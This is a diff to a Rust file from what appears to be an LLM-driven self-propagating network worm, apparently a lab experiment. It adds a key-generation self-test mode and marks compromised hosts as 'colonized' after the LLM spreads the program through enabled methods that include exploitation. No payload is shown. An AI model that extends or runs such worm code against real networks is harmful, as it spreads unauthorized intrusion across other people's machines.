@@ -60,6 +60,7 @@ impl LlmConfig {
         if cli.exploit_enabled {
             allowed_methods.push(PropagationMethodClass::Exploit);
         }
+        gate.allowed_methods = allowed_methods.clone();
 
         let client: Arc<dyn physarum_llm::LlmClient> = if endpoint == "mock" {
             Arc::new(MockLlmClient::no_path("mock mode — no real LLM"))
@@ -123,6 +124,10 @@ fn parse_cidr(cidr: Option<&str>) -> Option<Vec<(std::net::Ipv4Addr, u8)>> {
 }
 
 pub async fn run(mut cli: Cli) -> Result<()> {
+    if matches!(cli.mode, Mode::KeygenTest) {
+        return run_keygen_test().await;
+    }
+
     // Resolve interface name before anything uses it.
     // "auto" → find the interface whose IP is in --llm-allowed-cidr with the
     // highest prefix length (most specific = most likely the internal/lab NIC).
@@ -346,6 +351,7 @@ async fn handle_candidate(
         {
             LlmOutcome::Propagated => {
                 tracing::info!(%src_ip, "LLM propagation succeeded");
+                lineage.mark_colonized(&ip_str);
                 lineage.save()?;
                 return Ok(());
             }
@@ -408,7 +414,7 @@ async fn handle_candidate(
 
 fn init_lineage(cli: &Cli) -> Result<Lineage> {
     match &cli.mode {
-        Mode::Seed => {
+        Mode::Seed | Mode::KeygenTest => {
             let my_ip = local_ip(&cli.interface)?;
             tracing::info!(%my_ip, iface = %cli.interface, "seed mode");
             Ok(Lineage::seed(&my_ip.to_string()))
@@ -436,7 +442,7 @@ fn init_lineage(cli: &Cli) -> Result<Lineage> {
 /// Propagated mode: the last IP in the lineage path is the current host.
 fn resolve_local_ip(cli: &Cli, lineage: &Lineage) -> Option<Ipv4Addr> {
     match &cli.mode {
-        Mode::Seed => local_ip(&cli.interface).ok(),
+        Mode::Seed | Mode::KeygenTest => local_ip(&cli.interface).ok(),
         Mode::Propagated => lineage.path.last().and_then(|s| s.parse::<Ipv4Addr>().ok()),
     }
 }
@@ -576,4 +582,53 @@ fn ip_in_cidr(ip: std::net::Ipv4Addr, cidr: &str) -> bool {
 /// e.g. 255.255.255.0 → 24, 255.255.0.0 → 16.
 fn netmask_prefix(netmask: std::net::Ipv4Addr) -> u8 {
     u32::from(netmask).leading_ones() as u8
+}
+
+// ── KeygenTest mode ───────────────────────────────────────────────────────────
+
+async fn run_keygen_test() -> Result<()> {
+    use tokio::process::Command;
+
+    tracing::info!("keygen-test: generating ephemeral ed25519 keypair");
+
+    let key = crate::llm_loop::generate_ephemeral_keypair().await?;
+
+    tracing::info!(pubkey = %key.pubkey, "keygen-test: pubkey");
+
+    // Verify permissions: private key must be mode 600.
+    let meta = tokio::fs::metadata(&key.privkey_path).await?;
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        let mode = meta.permissions().mode() & 0o777;
+        anyhow::ensure!(
+            mode == 0o600,
+            "keygen-test: privkey permissions are {:o}, expected 600",
+            mode
+        );
+        tracing::info!(
+            mode = format!("{:o}", mode),
+            "keygen-test: privkey permissions OK"
+        );
+    }
+    #[cfg(not(unix))]
+    {
+        let _ = meta;
+    }
+
+    // Print fingerprint via ssh-keygen -l.
+    let pubkey_path = key.privkey_path.with_extension("pub");
+    let out = Command::new("ssh-keygen")
+        .args(["-l", "-f", pubkey_path.to_str().unwrap_or("")])
+        .output()
+        .await?;
+    let fingerprint = String::from_utf8_lossy(&out.stdout);
+    tracing::info!(fingerprint = %fingerprint.trim(), "keygen-test: fingerprint");
+
+    // Cleanup — private key must not persist.
+    tokio::fs::remove_file(&key.privkey_path).await?;
+    tokio::fs::remove_file(&pubkey_path).await?;
+    tracing::info!("keygen-test: keypair removed — OK");
+
+    Ok(())
 }
